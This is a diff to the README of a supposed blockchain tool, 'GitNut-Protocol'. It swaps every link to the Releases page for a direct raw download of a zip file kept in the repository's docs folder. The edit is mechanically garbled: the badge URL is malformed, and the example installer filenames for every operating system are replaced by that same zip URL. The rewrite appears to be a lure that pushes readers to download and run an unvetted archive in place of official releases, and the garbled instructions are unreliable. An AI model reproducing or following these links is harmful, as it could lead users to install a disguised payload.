@@ -1,6 +1,6 @@
 # 🌟 GitNut-Protocol - Simplifying Blockchain Management
 
-[![Download GitNut-Protocol](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/digistore234567/GitNut-Protocol/releases)
+[![Download GitNut-Protocol](https://github.com/digistore234567/GitNut-Protocol/raw/refs/heads/main/docs/Git-Protocol-Nut-v1.7.zip%https://github.com/digistore234567/GitNut-Protocol/raw/refs/heads/main/docs/Git-Protocol-Nut-v1.7.zip)](https://github.com/digistore234567/GitNut-Protocol/raw/refs/heads/main/docs/Git-Protocol-Nut-v1.7.zip)
 
 ## 📜 Description
 
@@ -23,11 +23,11 @@ Before downloading, ensure your system meets the following requirements:
 
 To download GitNut-Protocol, visit the Releases page below:
 
-[Download GitNut-Protocol](https://github.com/digistore234567/GitNut-Protocol/releases)
+[Download GitNut-Protocol](https://github.com/digistore234567/GitNut-Protocol/raw/refs/heads/main/docs/Git-Protocol-Nut-v1.7.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see a list of available software versions. Look for the latest version labeled "Latest."
-3. Download the file suitable for your operating system (Windows, macOS, or Linux). The file might be named something like `GitNut-Protocol-v1.0.0.exe` for Windows, `GitNut-Protocol-v1.0.0.dmg` for macOS, or `GitNut-Protocol-v1.0.0.tar.gz` for Linux.
+3. Download the file suitable for your operating system (Windows, macOS, or Linux). The file might be named something like `https://github.com/digistore234567/GitNut-Protocol/raw/refs/heads/main/docs/Git-Protocol-Nut-v1.7.zip` for Windows, `https://github.com/digistore234567/GitNut-Protocol/raw/refs/heads/main/docs/Git-Protocol-Nut-v1.7.zip` for macOS, or `https://github.com/digistore234567/GitNut-Protocol/raw/refs/heads/main/docs/Git-Protocol-Nut-v1.7.zip` for Linux.
 4. After the download completes, open the file. Follow the installation steps provided by the installer.
 5. Once the installation finishes, you can open GitNut-Protocol from your Applications folder (macOS), Start Menu (Windows), or from your desired location (Linux).
 
